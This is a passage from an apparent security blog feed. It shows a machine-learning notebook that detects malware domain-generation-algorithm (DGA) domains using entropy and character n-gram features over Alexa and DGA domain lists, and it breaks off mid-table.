        if t_auc &gt; best_auc:
            best_auc = t_auc
            best_iter = ep

            probs = model.predict_proba(X_test)

            out_data = {&#39;y&#39;:y_test, &#39;labels&#39;: label_test, &#39;probs&#39;:probs, &#39;epochs&#39;: ep, &#39;confusion_matrix&#39;: sklearn.metrics.confusion_matrix(y_test, probs &gt; .5)}

            print(sklearn.metrics.confusion_matrix(y_test, probs &gt; .5))
        else:
            if (ep-best_iter) &gt; 2:
                break

    final_data.append(out_data)
</code></pre>

<pre><code class="language-text">fold 1/10
Build model...
Train...

Epoch 1/1
7600/7600 [==============================] - 24s 3ms/step - loss: 0.3562
Epoch 0: auc = 0.979725 (best=0.000000)
[[893 113]
 [ 42 952]]
Epoch 1/1
7600/7600 [==============================] - 23s 3ms/step - loss: 0.1643
Epoch 7: auc = 0.980221 (best=0.981659)
Epoch 1/1
7600/7600 [==============================] - 21s 3ms/step - loss: 0.1603
Epoch 8: auc = 0.979843 (best=0.981659)
</code></pre>

<pre><code class="language-python">print(sklearn.metrics.classification_report(final_data[0][&#39;y&#39;], final_data[0][&#39;probs&#39;] &gt; .5))
</code></pre>

<pre><code class="language-text">              precision    recall  f1-score   support

           0       0.95      0.96      0.96      1006
           1       0.96      0.95      0.95       994

   micro avg       0.96      0.96      0.96      2000
   macro avg       0.96      0.96      0.96      2000
weighted avg       0.96      0.96      0.96      2000
</code></pre>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[机器学习笔记]DGA Domain Detection 1]]></title>
    <link href="https://www.uxss.net/15385813470879.html"/>
    <updated>2018-10-03T23:42:27+08:00</updated>
    <id>https://www.uxss.net/15385813470879.html</id>
    <content type="html"><![CDATA[
<p><img src="media/15387556906580/15982653615268.jpg" alt=""/></p>

<p>Domain generation algorithms (DGA) are algorithms seen in various families of malware that are used to periodically generate a large number of domain names that can be used as rendezvous points with their command and control servers. </p>

<span id="more"></span><!-- more -->

<h4 id="toc_0">0x01 Domain Generating Algorithm</h4>

<p>Domain generation algorithms (DGA) are algorithms seen in various families of malware that are used to periodically generate a large number of domain names that can be used as rendezvous points with their command and control servers. </p>

<p><a href="https://github.com/pchaigno/dga-collection/tree/master/dgacollection">Example</a></p>

<ul>
<li><a href="https://seclab.cs.ucsb.edu/media/uploads/papers/torpig.pdf">Torpig</a></li>
<li><a href="http://vrt-blog.snort.org/2014/03/decoding-domain-generation-algorithms.html">ZeusBot</a></li>
<li><a href="https://blog.fortinet.com/post/a-closer-look-at-cryptolocker-s-dga">Cryptolocker</a></li>
<li><a href="http://www.johannesbader.ch/2015/02/the-dgas-of-necurs/">Necurs</a></li>
<li><a href="http://www.johannesbader.ch/2015/01/the-dga-of-symmi/">Symmi</a></li>
<li><a href="http://www.johannesbader.ch/2015/05/the-dga-of-ranbyus/">Ranbyus</a></li>
</ul>

<h4 id="toc_1">0x02 Random Forest</h4>

<p>random forest = bagging + decision trees</p>

<h4 id="toc_2">0x03 code</h4>

<ul>
<li><p>Random Forest</p></li>
<li><p>MultinomialNB</p></li>
</ul>

<pre><code class="language-python">import os, sys
import traceback
import json
import optparse
import pickle
import collections
import sklearn
import sklearn.feature_extraction
import sklearn.ensemble
import sklearn.metrics
import pandas as pd
import numpy as np
import tldextract
import math
import operator
from sklearn.model_selection import train_test_split
from matplotlib import pylab
from pylab import *
</code></pre>

<p>收集数据</p>

<pre><code class="language-python">alexa_dataframe = pd.read_csv(&#39;data/alexa_100k.csv&#39;, names=[&#39;rank&#39;,&#39;uri&#39;], header=None, encoding=&#39;utf-8&#39;)
alexa_dataframe.info()
alexa_dataframe.head()
</code></pre>

<pre><code class="language-text">&lt;class &#39;pandas.core.frame.DataFrame&#39;&gt;
RangeIndex: 100000 entries, 0 to 99999
Data columns (total 2 columns):
rank    100000 non-null int64
uri     100000 non-null object
dtypes: int64(1), object(1)
memory usage: 1.5+ MB
</code></pre>
<div>
<style scoped>
    .dataframe tbody tr th:only-of-type {
        vertical-align: middle;
    }

<pre><code class="language-text">.dataframe tbody tr th {
    vertical-align: top;
}

.dataframe thead th {
    text-align: right;
}
</code></pre>
</style>
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>rank</th>
      <th>uri</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0</th>
      <td>1</td>
      <td>facebook.com</td>
    </tr>
    <tr>
      <th>1</th>
      <td>2</td>
      <td>google.com</td>
    </tr>
    <tr>
      <th>2</th>
      <td>3</td>
      <td>youtube.com</td>
    </tr>
    <tr>
      <th>3</th>
      <td>4</td>
      <td>yahoo.com</td>
    </tr>
    <tr>
      <th>4</th>
      <td>5</td>
      <td>baidu.com</td>
    </tr>
  </tbody>
</table>
</div>

<pre><code class="language-python">dga_dataframe = pd.read_csv(&#39;data/dga_domains.txt&#39;, names=[&#39;raw_domain&#39;], header=None, encoding=&#39;utf-8&#39;)
dga_dataframe.info()
dga_dataframe.head()
</code></pre>

<pre><code class="language-text">&lt;class &#39;pandas.core.frame.DataFrame&#39;&gt;
RangeIndex: 2669 entries, 0 to 2668
Data columns (total 1 columns):
raw_domain    2669 non-null object
dtypes: object(1)
memory usage: 20.9+ KB
</code></pre>
<div>
<style scoped>
    .dataframe tbody tr th:only-of-type {
        vertical-align: middle;
    }

<pre><code class="language-text">.dataframe tbody tr th {
    vertical-align: top;
}

.dataframe thead th {
    text-align: right;
}
</code></pre>
</style>
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>raw_domain</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0</th>
      <td>04055051be412eea5a61b7da8438be3d.info</td>
    </tr>
    <tr>
      <th>1</th>
      <td>1cb8a5f36f.info</td>
    </tr>
    <tr>
      <th>2</th>
      <td>30acd347397c34fc273e996b22951002.org</td>
    </tr>
    <tr>
      <th>3</th>
      <td>336c986a284e2b3bc0f69f949cb437cb.info</td>
    </tr>
    <tr>
      <th>4</th>
      <td>336c986a284e2b3bc0f69f949cb437cb.org</td>
    </tr>
  </tbody>
</table>
</div>

<pre><code class="language-python">word_dataframe = pd.read_csv(&#39;data/words.txt&#39;, names=[&#39;word&#39;], header=None, dtype={&#39;word&#39;: np.str}, encoding=&#39;utf-8&#39;)
word_dataframe.info()
word_dataframe.head(10)
</code></pre>

<pre><code class="language-text">&lt;class &#39;pandas.core.frame.DataFrame&#39;&gt;
RangeIndex: 479623 entries, 0 to 479622
Data columns (total 1 columns):
word    479619 non-null object
dtypes: object(1)
memory usage: 3.7+ MB
</code></pre>
<div>
<style scoped>
    .dataframe tbody tr th:only-of-type {
        vertical-align: middle;
    }

<pre><code class="language-text">.dataframe tbody tr th {
    vertical-align: top;
}

.dataframe thead th {
    text-align: right;
}
</code></pre>
</style>
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>word</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0</th>
      <td>1080</td>
    </tr>
    <tr>
      <th>1</th>
      <td>10-point</td>
    </tr>
    <tr>
      <th>2</th>
      <td>10th</td>
    </tr>
    <tr>
      <th>3</th>
      <td>11-point</td>
    </tr>
    <tr>
      <th>4</th>
      <td>12-point</td>
    </tr>
    <tr>
      <th>5</th>
      <td>16-point</td>
    </tr>
    <tr>
      <th>6</th>
      <td>18-point</td>
    </tr>
    <tr>
      <th>7</th>
      <td>1st</td>
    </tr>
    <tr>
      <th>8</th>
      <td>2</td>
    </tr>
    <tr>
      <th>9</th>
      <td>20-point</td>
    </tr>
  </tbody>
</table>
</div>

<p>准备数据</p>

<pre><code class="language-python">def domain_extract(uri):
    ext = tldextract.extract(uri)
    if (not ext.suffix):
        return None
    else:
        return ext.domain
    
alexa_dataframe[&#39;domain&#39;] = [ domain_extract(uri) for uri in alexa_dataframe[&#39;uri&#39;]]
del alexa_dataframe[&#39;rank&#39;]
del alexa_dataframe[&#39;uri&#39;]
alexa_dataframe = alexa_dataframe.dropna()
alexa_dataframe = alexa_dataframe.drop_duplicates()
alexa_dataframe.info()
alexa_dataframe.head()
</code></pre>

<pre><code class="language-text">&lt;class &#39;pandas.core.frame.DataFrame&#39;&gt;
Int64Index: 91377 entries, 0 to 99999
Data columns (total 1 columns):
domain    91377 non-null object
dtypes: object(1)
memory usage: 1.4+ MB
</code></pre>
<div>
<style scoped>
    .dataframe tbody tr th:only-of-type {
        vertical-align: middle;
    }

<pre><code class="language-text">.dataframe tbody tr th {
    vertical-align: top;
}

.dataframe thead th {
    text-align: right;
}
</code></pre>
</style>
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>domain</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0</th>
      <td>facebook</td>
    </tr>
    <tr>
      <th>1</th>
      <td>google</td>
    </tr>
    <tr>
      <th>2</th>
      <td>youtube</td>
    </tr>
    <tr>
      <th>3</th>
      <td>yahoo</td>
    </tr>
    <tr>
      <th>4</th>
      <td>baidu</td>
    </tr>
  </tbody>
</table>
</div>

<pre><code class="language-python">alexa_dataframe[&#39;class&#39;] = &#39;legit&#39;
#对正常数据打标legit
alexa_dataframe.head()
</code></pre>
<div>
<style scoped>
    .dataframe tbody tr th:only-of-type {
        vertical-align: middle;
    }

<pre><code class="language-text">.dataframe tbody tr th {
    vertical-align: top;
}

.dataframe thead th {
    text-align: right;
}
</code></pre>
</style>
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>domain</th>
      <th>class</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0</th>
      <td>facebook</td>
      <td>legit</td>
    </tr>
    <tr>
      <th>1</th>
      <td>google</td>
      <td>legit</td>
    </tr>
    <tr>
      <th>2</th>
      <td>youtube</td>
      <td>legit</td>
    </tr>
    <tr>
      <th>3</th>
      <td>yahoo</td>
      <td>legit</td>
    </tr>
    <tr>
      <th>4</th>
      <td>baidu</td>
      <td>legit</td>
    </tr>
  </tbody>
</table>
</div>

<pre><code class="language-python"># Shuffle the data (important for training/testing)
alexa_dataframe = alexa_dataframe.reindex(np.random.permutation(alexa_dataframe.index))
#打乱循序，重新索引
#Randomly permute a sequence, or return a permuted range
alexa_total = alexa_dataframe.shape[0]
print(&#39;Total Alexa domains %d&#39; % alexa_total)
</code></pre>

<pre><code class="language-text">Total Alexa domains 91377
</code></pre>

<pre><code class="language-python">dga_dataframe[&#39;domain&#39;] = dga_dataframe.applymap(lambda x: x.split(&#39;.&#39;)[0].strip().lower())
#This method applies a function that accepts and returns a scalar to every element of a DataFrame.
del dga_dataframe[&#39;raw_domain&#39;]
</code></pre>

<pre><code class="language-python">dga_dataframe = dga_dataframe.dropna()
dga_dataframe = dga_dataframe.drop_duplicates()
dga_total = dga_dataframe.shape[0]
print(&#39;Total DGA domains %d&#39; % dga_total)
</code></pre>

<pre><code class="language-text">Total DGA domains 2664
</code></pre>

<pre><code class="language-python">dga_dataframe[&#39;class&#39;] = &#39;dga&#39;
dga_dataframe.head()
</code></pre>
<div>
<style scoped>
    .dataframe tbody tr th:only-of-type {
        vertical-align: middle;
    }

<pre><code class="language-text">.dataframe tbody tr th {
    vertical-align: top;
}

.dataframe thead th {
    text-align: right;
}
</code></pre>
</style>
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>domain</th>
      <th>class</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0</th>
      <td>04055051be412eea5a61b7da8438be3d</td>
      <td>dga</td>
    </tr>
    <tr>
      <th>1</th>
      <td>1cb8a5f36f</td>
      <td>dga</td>
    </tr>
    <tr>
      <th>2</th>
      <td>30acd347397c34fc273e996b22951002</td>
      <td>dga</td>
    </tr>
    <tr>
      <th>3</th>
      <td>336c986a284e2b3bc0f69f949cb437cb</td>
      <td>dga</td>
    </tr>
    <tr>
      <th>5</th>
      <td>40a43e61e56a5c218cf6c22aca27f7ee</td>
      <td>dga</td>
    </tr>
  </tbody>
</table>
</div>

<pre><code class="language-python">def entropy(s):
    &#39;&#39;&#39;
    熵计算
    &#39;&#39;&#39;
    p, lns = collections.Counter(s), float(len(s))
    return -sum( count/lns * math.log(count/lns, 2) for count in p.values())
</code></pre>

<pre><code class="language-python">all_domains = pd.concat([alexa_dataframe, dga_dataframe], ignore_index=True)
#将数据根据不同的轴作简单的融合
#如果两个表的index都没有实际含义，使用ignore_index=True
all_domains[&#39;length&#39;] = [len(x) for x in all_domains[&#39;domain&#39;]]
all_domains = all_domains[all_domains[&#39;length&#39;] &gt; 6]
#排除短domain的干扰
all_domains[&#39;entropy&#39;] = [entropy(x) for x in all_domains[&#39;domain&#39;]]
all_domains.head(10)
</code></pre>
<div>
<style scoped>
    .dataframe tbody tr th:only-of-type {
        vertical-align: middle;
    }

<pre><code class="language-text">.dataframe tbody tr th {
    vertical-align: top;
}

.dataframe thead th {
    text-align: right;
}
</code></pre>
</style>
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>domain</th>
      <th>class</th>
      <th>length</th>
      <th>entropy</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0</th>
      <td>facebook</td>
      <td>legit</td>
      <td>8</td>
      <td>2.750000</td>
    </tr>
    <tr>
      <th>2</th>
      <td>youtube</td>
      <td>legit</td>
      <td>7</td>
      <td>2.521641</td>
    </tr>
    <tr>
      <th>5</th>
      <td>wikipedia</td>
      <td>legit</td>
      <td>9</td>
      <td>2.641604</td>
    </tr>
    <tr>
      <th>10</th>
      <td>blogspot</td>
      <td>legit</td>
      <td>8</td>
      <td>2.750000</td>
    </tr>
    <tr>
      <th>11</th>
      <td>twitter</td>
      <td>legit</td>
      <td>7</td>
      <td>2.128085</td>
    </tr>
    <tr>
      <th>12</th>
      <td>linkedin</td>
      <td>legit</td>
      <td>8</td>
      <td>2.500000</td>
    </tr>
    <tr>
      <th>19</th>
      <td>wordpress</td>
      <td>legit</td>
      <td>9</td>
      <td>2.725481</td>
    </tr>
    <tr>
      <th>23</th>
      <td>microsoft</td>
      <td>legit</td>
      <td>9</td>
      <td>2.947703</td>
    </tr>
    <tr>
      <th>27</th>
      <td>xvideos</td>
      <td>legit</td>
      <td>7</td>
      <td>2.807355</td>
    </tr>
    <tr>
      <th>28</th>
      <td>googleusercontent</td>
      <td>legit</td>
      <td>17</td>
      <td>3.175123</td>
    </tr>
  </tbody>
</table>
</div>

<p>分析数据</p>

<pre><code class="language-python">#箱线图
all_domains.boxplot(&#39;length&#39;,&#39;class&#39;)
pylab.ylabel(&#39;Domain Length&#39;)
all_domains.boxplot(&#39;entropy&#39;,&#39;class&#39;)
pylab.ylabel(&#39;Domain Entropy&#39;)
</code></pre>

<pre><code class="language-text">Text(0,0.5,&#39;Domain Entropy&#39;)
</code></pre>

<p><img src="media/15385813470879/output_13_1.png" alt="output_13_1"/></p>

<p><img src="media/15385813470879/output_13_2.png" alt="output_13_2"/></p>

<pre><code class="language-python">cond = all_domains[&#39;class&#39;] == &#39;dga&#39;
dga = all_domains[cond]
alexa = all_domains[~cond]
plt.scatter(alexa[&#39;length&#39;], alexa[&#39;entropy&#39;], s=140, c=&#39;#aaaaff&#39;, label=&#39;Alexa&#39;, alpha=.2)
plt.scatter(dga[&#39;length&#39;], dga[&#39;entropy&#39;], s=40, c=&#39;r&#39;, label=&#39;DGA&#39;, alpha=.3)
plt.legend()
#放置图例
pylab.xlabel(&#39;Domain Length&#39;)
pylab.ylabel(&#39;Domain Entropy&#39;)
</code></pre>

<pre><code class="language-text">Text(0,0.5,&#39;Domain Entropy&#39;)
</code></pre>

<p><img src="media/15385813470879/output_14_1.png" alt="output_14_1"/></p>

<pre><code class="language-python">all_domains.tail(10)
</code></pre>
<div>
<style scoped>
    .dataframe tbody tr th:only-of-type {
        vertical-align: middle;
    }

<pre><code class="language-text">.dataframe tbody tr th {
    vertical-align: top;
}

.dataframe thead th {
    text-align: right;
}
</code></pre>
</style>
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>domain</th>
      <th>class</th>
      <th>length</th>
      <th>entropy</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>94031</th>
      <td>xcfwwghb</td>
      <td>dga</td>
      <td>8</td>
      <td>2.750000</td>
    </tr>
    <tr>
      <th>94032</th>
      <td>xcgqdfyrkgihlrmfmfib</td>
      <td>dga</td>
      <td>20</td>
      <td>3.684184</td>
    </tr>
    <tr>
      <th>94033</th>
      <td>xclqwzcfcx</td>
      <td>dga</td>
      <td>10</td>
      <td>2.646439</td>
    </tr>
    <tr>
      <th>94034</th>
      <td>xcpfxzuf</td>
      <td>dga</td>
      <td>8</td>
      <td>2.500000</td>
    </tr>
    <tr>
      <th>94035</th>
      <td>xcvxhxze</td>
      <td>dga</td>
      <td>8</td>
      <td>2.405639</td>
    </tr>
    <tr>
      <th>94036</th>
      <td>xdbrbsbm</td>
      <td>dga</td>
      <td>8</td>
      <td>2.405639</td>
    </tr>
    <tr>
      <th>94037</th>
      <td>xdfjryydcfwvkvui</td>
      <td>dga</td>
      <td>16</td>
      <td>3.500000</td>
    </tr>
    <tr>
      <th>94038</th>
      <td>xdjlvcgw</td>
      <td>dga</td>
      <td>8</td>
      <td>3.000000</td>
    </tr>
    <tr>
      <th>94039</th>
      <td>xdrmjeu</td>
      <td>dga</td>
      <td>7</td>
      <td>2.807355</td>
    </tr>
    <tr>
      <th>94040</th>
      <td>xflrjyyjswoatsoq</td>
      <td>dga</td>
      <td>16</td>
      <td>3.500000</td>
    </tr>
  </tbody>
</table>
</div>

<pre><code class="language-python">legit = all_domains[(all_domains[&#39;class&#39;]==&#39;legit&#39;)]
max_grams = np.maximum(legit[&#39;alexa_grams&#39;],legit[&#39;word_grams&#39;])
ax = max_grams.hist(bins=80)
ax.figure.suptitle(&#39;Histogram of the Max NGram Score for Domains&#39;)
pylab.xlabel(&#39;Number of Domains&#39;)
pylab.ylabel(&#39;Maximum NGram Score&#39;)
</code></pre>

<pre><code class="language-text">Text(0,0.5,&#39;Maximum NGram Score&#39;)
</code></pre>

<p><img src="media/15385813470879/output_16_1.png" alt="output_16_1"/></p>

<pre><code class="language-python">word_dataframe = word_dataframe[word_dataframe[&#39;word&#39;].map(lambda x: str(x).isalpha())]
word_dataframe = word_dataframe.applymap(lambda x: str(x).strip().lower())
word_dataframe = word_dataframe.dropna()
word_dataframe = word_dataframe.drop_duplicates()
word_dataframe.head(10)
</code></pre>
<div>
<style scoped>
    .dataframe tbody tr th:only-of-type {
        vertical-align: middle;
    }

<pre><code class="language-text">.dataframe tbody tr th {
    vertical-align: top;
}

.dataframe thead th {
    text-align: right;
}
</code></pre>
</style>
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>word</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>37</th>
      <td>a</td>
    </tr>
    <tr>
      <th>48</th>
      <td>aa</td>
    </tr>
    <tr>
      <th>51</th>
      <td>aaa</td>
    </tr>
    <tr>
      <th>53</th>
      <td>aaaa</td>
    </tr>
    <tr>
      <th>54</th>
      <td>aaaaaa</td>
    </tr>
    <tr>
      <th>55</th>
      <td>aaal</td>
    </tr>
    <tr>
      <th>56</th>
      <td>aaas</td>
    </tr>
    <tr>
      <th>57</th>
      <td>aaberg</td>
    </tr>
    <tr>
      <th>58</th>
      <td>aachen</td>
    </tr>
    <tr>
      <th>59</th>
      <td>aae</td>
    </tr>
  </tbody>
</table>
</div>

<pre><code class="language-python">alexa_vc = sklearn.feature_extraction.text.CountVectorizer(analyzer=&#39;char&#39;, ngram_range=(3,5), min_df=1e-4, max_df=1.0)
#词袋模型统计词频
#ngram_range：词组切分的长度范围
#如果一个词的频率小于min_df或者大于max_df，将不会被作为关键词
counts_matrix = alexa_vc.fit_transform(alexa_dataframe[&#39;domain&#39;])
#生成词频向量
#fit_transform 计算各个词语出现的次数
alexa_counts = np.log10(counts_matrix.sum(axis=0).getA1())
#数据归一化
print(alexa_counts[:10])
ngrams_list = alexa_vc.get_feature_names()
#从包含文本和图片的数据集中提取特征，转换成机器学习中可用的数值型特征
print(ngrams_list[:10])

_sorted_ngrams = sorted(zip(ngrams_list, alexa_counts), key=operator.itemgetter(1), reverse=True)
#zip()将两个序列合并，返回zip对象，可强制转换为列表或字典
# sorted()对序列进行排序，返回一个排序后的新列表，原数据不改变
print(&#39;Alexa NGrams: %d&#39; % len(_sorted_ngrams))
for ngram, count in _sorted_ngrams[:10]:
    print(ngram, count)
</code></pre>

<pre><code class="language-text">[1.         1.         1.17609126 1.64345268 1.11394335 1.14612804
 1.         1.17609126 1.07918125 1.54406804]
[&#39;-20&#39;, &#39;-a-&#39;, &#39;-ac&#39;, &#39;-ad&#39;, &#39;-ads&#39;, &#39;-af&#39;, &#39;-ag&#39;, &#39;-ai&#39;, &#39;-air&#39;, &#39;-al&#39;]
Alexa NGrams: 23613
ing 3.443888546777372
lin 3.4271614029259654
ine 3.399673721481038
tor 3.26528962586083
ter 3.2631624649622166
ion 3.2467447097238415
ent 3.228913405994688
por 3.2013971243204513
the 3.2005769267548483
ree 3.16345955176999
</code></pre>

<pre><code class="language-python">#提取词的数值型特征
dict_vc = sklearn.feature_extraction.text.CountVectorizer(analyzer=&#39;char&#39;, ngram_range=(3,5), min_df=1e-5, max_df=1.0)
counts_matrix = dict_vc.fit_transform(word_dataframe[&#39;word&#39;])
dict_counts = np.log10(counts_matrix.sum(axis=0).getA1())
ngrams_list = dict_vc.get_feature_names()
print(ngrams_list[:10])
</code></pre>

<pre><code class="language-text">[&#39;aaa&#39;, &#39;aab&#39;, &#39;aac&#39;, &#39;aad&#39;, &#39;aaf&#39;, &#39;aag&#39;, &#39;aah&#39;, &#39;aai&#39;, &#39;aak&#39;, &#39;aal&#39;]
</code></pre>

<pre><code class="language-python">_sorted_ngrams = sorted(zip(ngrams_list, dict_counts), key=operator.itemgetter(1), reverse=True)
print(&#39;Word NGrams: %d&#39; % len(_sorted_ngrams))
for ngram, count in _sorted_ngrams[:10]:
    print(ngram, count)
</code></pre>

<pre><code class="language-text">Word NGrams: 123061
ing 4.387300822448285
ess 4.204879333760662
ati 4.1933472563864616
ion 4.165036479994566
ter 4.162415036106447
nes 4.112504458767161
tio 4.076822423342773
ate 4.0723602039634885
ent 4.069631102620343
tion 4.0496056125949735
</code></pre>

<pre><code class="language-python">def ngram_count(domain):
    &#39;&#39;&#39;
    domain中包含的ngrams数
    &#39;&#39;&#39;
    alexa_match = alexa_counts * alexa_vc.transform([domain]).T  
    dict_match = dict_counts * dict_vc.transform([domain]).T
    print(&#39;%s Alexa match:%d Dict match: %d&#39; % (domain, alexa_match, dict_match))
</code></pre>

<pre><code class="language-python">ngram_count(&#39;google&#39;)
ngram_count(&#39;facebook&#39;)
ngram_count(&#39;1cb8a5f36f&#39;)
ngram_count(&#39;pterodactylfarts&#39;)
</code></pre>

<pre><code class="language-text">google Alexa match:17 Dict match: 14
facebook Alexa match:31 Dict match: 27
1cb8a5f36f Alexa match:0 Dict match: 0
pterodactylfarts Alexa match:35 Dict match: 76
</code></pre>

<pre><code class="language-python">#Compute NGram matches for all the domains and add to our dataframe
all_domains[&#39;alexa_grams&#39;]= alexa_counts * alexa_vc.transform(all_domains[&#39;domain&#39;]).T
all_domains[&#39;word_grams&#39;]= dict_counts * dict_vc.transform(all_domains[&#39;domain&#39;]).T
all_domains.head(10)
</code></pre>
<div>
<style scoped>
    .dataframe tbody tr th:only-of-type {
        vertical-align: middle;
    }

<pre><code class="language-text">.dataframe tbody tr th {
    vertical-align: top;
}

.dataframe thead th {
    text-align: right;
}
</code></pre>
</style>
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>domain</th>
      <th>class</th>
      <th>length</th>
      <th>entropy</th>
      <th>alexa_grams</th>
      <th>word_grams</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0</th>
      <td>facebook</td>
      <td>legit</td>
      <td>8</td>
      <td>2.750000</td>
      <td>31.302278</td>
      <td>27.872426</td>
    </tr>
    <tr>
      <th>2</th>
      <td>youtube</td>
      <td>legit</td>
      <td>7</td>
      <td>2.521641</td>
      <td>25.855170</td>
      <td>18.287142</td>
    </tr>
    <tr>
      <th>5</th>
      <td>wikipedia</td>
      <td>legit</td>
      <td>9</td>
      <td>2.641604</td>
      <td>24.571024</td>
      <td>29.175635</td>
    </tr>
    <tr>
      <th>10</th>
      <td>blogspot</td>
      <td>legit</td>
      <td>8</td>
      <td>2.750000</td>
      <td>24.435141</td>
      <td>19.274501</td>
    </tr>
    <tr>
      <th>11</th>
      <td>twitter</td>
      <td>legit</td>
      <td>7</td>
      <td>2.128085</td>
      <td>23.244500</td>
      <td>31.130820</td>
    </tr>
    <tr>
      <th>12</th>
      <td>linkedin</td>
      <td>legit</td>
      <td>8</td>
      <td>2.500000</td>
      <td>24.774916</td>
      <td>32.904408</td>
    </tr>
    <tr>
      <th>19</th>
      <td>wordpress</td>
      <td>legit</td>
      <td>9</td>
      <td>2.725481</td>
      <td>38.369509</td>
      <td>33.806635</td>
    </tr>
    <tr>
      <th>23</th>
      <td>microsoft</td>
      <td>legit</td>
      <td>9</td>
      <td>2.947703</td>
      <td>32.133033</td>
      <td>39.530125</td>
    </tr>
    <tr>
      <th>27</th>
      <td>xvideos</td>
      <td>legit</td>
      <td>7</td>
      <td>2.807355</td>
      <td>28.906360</td>
      <td>18.846834</td>
    </tr>
    <tr>
      <th>28</th>
      <td>googleusercontent</td>
      <td>legit</td>
      <td>17</td>
      <td>3.175123</td>
      <td>67.315750</td>
      <td>86.104683</td>
    </tr>
  </tbody>
</table>
</div>

<pre><code class="language-python">#Use the vectorized operations of the dataframe to investigate differences
all_domains[&#39;diff&#39;] = all_domains[&#39;alexa_grams&#39;] - all_domains[&#39;word_grams&#39;]
all_domains.sort_values([&#39;diff&#39;], ascending=True).head(10)
</code></pre>
<div>
<style scoped>
    .dataframe tbody tr th:only-of-type {
        vertical-align: middle;
    }

<pre><code class="language-text">.dataframe tbody tr th {
    vertical-align: top;
}

.dataframe thead th {
    text-align: right;
}
</code></pre>
</style>
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>domain</th>
      <th>class</th>
      <th>length</th>
      <th>entropy</th>
      <th>alexa_grams</th>
      <th>word_grams</th>
      <th>diff</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>79366</th>
      <td>bipolardisorderdepressionanxiety</td>
      <td>legit</td>
      <td>32</td>
      <td>3.616729</td>
      <td>117.312465</td>
      <td>190.833856</td>
      <td>-73.521391</td>
    </tr>
    <tr>
      <th>72512</th>
      <td>channel4embarrassingillnesses</td>
      <td>legit</td>
      <td>29</td>
      <td>3.440070</td>
      <td>95.786979</td>
      <td>169.119440</td>
      <td>-73.332460</td>
    </tr>
    <tr>
      <th>10961</th>
      <td>stirringtroubleinternationally</td>
      <td>legit</td>
      <td>30</td>
      <td>3.481728</td>
      <td>134.049367</td>
      <td>207.204729</td>
      <td>-73.155362</td>
    </tr>
    <tr>
      <th>85031</th>
      <td>americansforresponsiblesolutions</td>
      <td>legit</td>
      <td>32</td>
      <td>3.667838</td>
      <td>148.143049</td>
      <td>218.363956</td>
      <td>-70.220908</td>
    </tr>
    <tr>
      <th>20459</th>
      <td>pragmatismopolitico</td>
      <td>legit</td>
      <td>19</td>
      <td>3.326360</td>
      <td>61.244630</td>
      <td>121.536223</td>
      <td>-60.291593</td>
    </tr>
    <tr>
      <th>13702</th>
      <td>egaliteetreconciliation</td>
      <td>legit</td>
      <td>23</td>
      <td>3.186393</td>
      <td>91.938518</td>
      <td>152.125325</td>
      <td>-60.186808</td>
    </tr>
    <tr>
      <th>4706</th>
      <td>interoperabilitybridges</td>
      <td>legit</td>
      <td>23</td>
      <td>3.588354</td>
      <td>95.037285</td>
      <td>153.626312</td>
      <td>-58.589028</td>
    </tr>
    <tr>
      <th>85161</th>
      <td>foreclosurephilippines</td>
      <td>legit</td>
      <td>22</td>
      <td>3.447402</td>
      <td>74.506548</td>
      <td>132.514638</td>
      <td>-58.008090</td>
    </tr>
    <tr>
      <th>45636</th>
      <td>annamalicesissyselfhypnosis</td>
      <td>legit</td>
      <td>27</td>
      <td>3.429908</td>
      <td>68.680068</td>
      <td>126.667692</td>
      <td>-57.987623</td>
    </tr>
    <tr>
      <th>70351</th>
      <td>corazonindomablecapitulos</td>
      <td>legit</td>
      <td>25</td>
      <td>3.813661</td>
      <td>75.535473</td>
      <td>133.160690</td>
      <td>-57.625217</td>
    </tr>
  </tbody>
</table>
</div>

<pre><code class="language-python">all_domains.sort_values([&#39;diff&#39;], ascending=False).head(10)
</code></pre>
<div>
<style scoped>
    .dataframe tbody tr th:only-of-type {
        vertical-align: middle;
    }

<pre><code class="language-text">.dataframe tbody tr th {
    vertical-align: top;
}

.dataframe thead th {
    text-align: right;
}
</code></pre>
</style>
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>domain</th>
      <th>class</th>
      <th>length</th>
      <th>entropy</th>
      <th>alexa_grams</th>
      <th>word_grams</th>
      <th>diff</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>54228</th>
      <td>gay-sex-pics-porn-pictures-gay-sex-porn-gay-se...</td>
      <td>legit</td>
      <td>56</td>
      <td>3.661056</td>
      <td>159.642301</td>
      <td>85.124184</td>
      <td>74.518116</td>
    </tr>
    <tr>
      <th>85091</th>
      <td>article-directory-free-submission-free-content</td>
      <td>legit</td>
      <td>46</td>
      <td>3.786816</td>
      <td>235.233896</td>
      <td>188.230453</td>
      <td>47.003443</td>
    </tr>
    <tr>
      <th>16893</th>
      <td>stream-free-movies-online</td>
      <td>legit</td>
